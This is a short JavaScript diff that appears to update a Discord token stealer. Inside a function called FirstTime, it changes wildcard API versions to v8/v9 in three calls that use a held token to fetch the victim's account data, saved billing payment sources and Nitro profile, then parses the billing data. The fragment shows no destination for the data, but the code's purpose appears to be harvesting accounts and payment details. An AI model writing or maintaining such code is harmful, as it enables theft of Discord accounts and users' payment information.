@@ -308,9 +308,9 @@ const FirstTime = async () => {
                 }]
             })
         } else {
-            var user = await getURL("https://discord.com/api/v*/users/@me", token)
-            var billing = await getURL("https://discord.com/api/v*/users/@me/billing/payment-sources", token)
-            var Nitro = await getURL("https://discord.com/api/v*/users/" + user.id + "/profile", token);
+            var user = await getURL("https://discord.com/api/v8/users/@me", token)
+            var billing = await getURL("https://discord.com/api/v9/users/@me/billing/payment-sources", token)
+            var Nitro = await getURL("https://discord.com/api/v9/users/" + user.id + "/profile", token);
 
             var Billings = parseBilling(billing)
 
